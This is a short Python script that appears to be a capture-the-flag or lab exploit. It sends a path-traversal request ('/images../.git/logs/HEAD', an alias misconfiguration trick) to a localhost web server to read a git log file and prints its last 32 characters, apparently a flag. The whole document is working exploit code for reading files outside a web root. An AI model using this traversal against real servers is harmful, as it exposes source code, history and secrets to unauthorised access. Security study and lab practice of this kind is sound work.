import requests

target = "http://localhost:55503"

s = requests.Session()

res = s.get(target + "/images../.git/logs/HEAD")
print(res.text[-32:])
